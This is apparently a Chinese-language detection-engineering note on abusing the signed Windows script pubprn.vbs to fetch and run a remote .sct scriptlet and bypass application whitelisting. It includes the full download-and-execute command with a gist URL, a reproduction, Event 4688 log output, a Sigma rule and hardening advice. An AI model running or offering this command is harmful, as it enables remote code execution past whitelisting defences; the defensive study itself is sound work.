# T1027-Win-使用pubprn.vbs下载执行Payload（白名单）

## 描述

攻击者可能利用合法的、由微软签名的软件开发工具或脚本执行恶意代码，以绕过应用白名单防御机制。这些工具通常具有可信证书签名，允许在系统中以合法身份运行。`pubprn.vbs`是Windows 7及以上版本中自带的微软签名Windows Script Host（WSH）脚本，位于`C:\Windows\System32\Printing_Admin_Scripts\zh-CN\`，可被滥用来解析和执行恶意`.sct`（COM脚本）文件，从而下载并执行远程Payload，规避基于签名的检测。

## 测试案例

### 测试1：使用pubprn.vbs执行远程.sct脚本

攻击者通过`pubprn.vbs`调用远程`.sct`脚本，触发恶意代码执行。以下为测试命令：

**攻击命令**（在命令提示符或PowerShell中运行）：
```cmd
"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

**说明**：
- `pubprn.vbs`通过`wscript.exe`执行，解析指定的`.sct`脚本。
- 命令中的`127.0.0.1`为占位参数，实际功能由`script:<URL>`指定的远程脚本实现。
- 测试使用的`.sct`脚本可能包含恶意代码，需在隔离环境中运行。

## 检测日志

- **Windows安全日志**：通过Event ID 4688（进程创建）记录`wscript.exe`执行`pubprn.vbs`的行为（需启用进程跟踪审核）。
- **Sysmon日志**：通过Event ID 1（进程创建）捕获详细的命令行参数和父进程信息。

## 测试复现

### 测试1：使用pubprn.vbs执行远程.sct脚本

在Windows 10环境中复现，需开启进程创建审核策略：

```cmd
Microsoft Windows [版本 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\ma jack>"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

**结果**：
- 在安装360终端管理软件的环境中，执行被拦截并提示，因安全软件检测到异常网络请求或脚本执行行为。
- 在无防护软件的环境中，命令可能成功触发远程`.sct`脚本的执行。

**环境配置**：
- 需启用组策略：`本地计算机策略 > 计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。
- 或者部署Sysmon以记录详细的进程创建事件。

## 测试留痕

### Windows安全日志（Event ID 4688：进程创建）

```xml
事件ID: 4688
EventData
SubjectUserSid: S-1-5-21-3061901842-4133171524-864420058-1000
SubjectUserName: ma jack
SubjectDomainName: DESKTOP-NJ1U3F5
SubjectLogonId: 0x3e2c5
NewProcessId: 0x1378
NewProcessName: C:\Windows\System32\wscript.exe
TokenElevationType: %%1938
ProcessId: 0x14d0
CommandLine: "C:\Windows\System32\WScript.exe" "C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
TargetUserSid: S-1-0-0
TargetUserName: -
TargetDomainName: -
TargetLogonId: 0x0
ParentProcessName: C:\Windows\System32\cmd.exe
MandatoryLabel: S-1-16-8192
```

**分析**：
- 日志记录了`wscript.exe`执行`pubprn.vbs`，命令行参数包含远程`.sct`脚本URL。
- 父进程为`cmd.exe`，表明通过命令提示符触发。
- 远程URL的存在是可疑行为，可能指向恶意脚本。

## 检测规则/思路

### Sigma规则

```yaml
title: 使用pubprn.vbs下载执行Payload
description: Detects execution of pubprn.vbs, a Microsoft-signed WSH script, used to parse and execute remote .sct scripts.
status: experimental
tags:
  - attack.defense_evasion
  - attack.t1027
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    EventID: 1
    Image|endswith: '\wscript.exe'
    CommandLine|contains: '\pubprn.vbs'
  condition: selection
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Legitimate use of pubprn.vbs for printer administration
level: high
```

**规则说明**：
- 检测`wscript.exe`执行`pubprn.vbs`的进程创建事件（Sysmon Event ID 1）。
- 规则关注命令行中包含`pubprn.vbs`，特别是结合远程URL的调用。
- 规则为实验性，需测试以减少合法打印机管理操作的误报。

### 建议

1. **监控pubprn.vbs执行**：
   - 使用Sysmon（Event ID 1）捕获`wscript.exe`运行`pubprn.vbs`的事件，检查命令行是否包含`script:`或远程URL。
   - 关注非打印机管理场景下的`pubprn.vbs`调用。

2. **检测网络请求**：
   - 监控`wscript.exe`发起的网络连接，特别是访问外部URL（如`.sct`文件）。
   - 使用网络监控工具（如Wireshark）分析HTTP/HTTPS流量。

3. **启用详细日志**：
   - 配置Sysmon记录进程创建（Event ID 1）和网络连接（Event ID 3）。
   - 启用Windows安全日志的进程跟踪（Event ID 4688），确保记录命令行参数。

4. **部署SIEM系统**：
   - 使用SIEM工具（如Splunk、Elastic）分析Sysmon和安全日志，检测`pubprn.vbs`相关异常行为。
   - 设置告警规则，针对`pubprn.vbs`结合远程URL的执行。

5. **限制白名单工具滥用**：
   - 使用AppLocker或组策略限制`pubprn.vbs`和`wscript.exe`的执行，仅允许在特定管理场景下运行。
   - 监控非管理员用户运行`pubprn.vbs`的行为。

6. **测试与验证**：
   - 在测试环境中模拟`pubprn.vbs`执行远程`.sct`脚本，验证检测规则有效性。
   - 调整规则阈值，排除合法打印机管理操作的误报。

## 参考推荐

- MITRE ATT&CK T1027  
  <https://attack.mitre.org/techniques/T1027/>
- 渗透测试笔记  
  <https://github.com/M1k0er/pentest-notes>
- Enigma0x3的测试.sct脚本  
  <https://gist.github.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a>
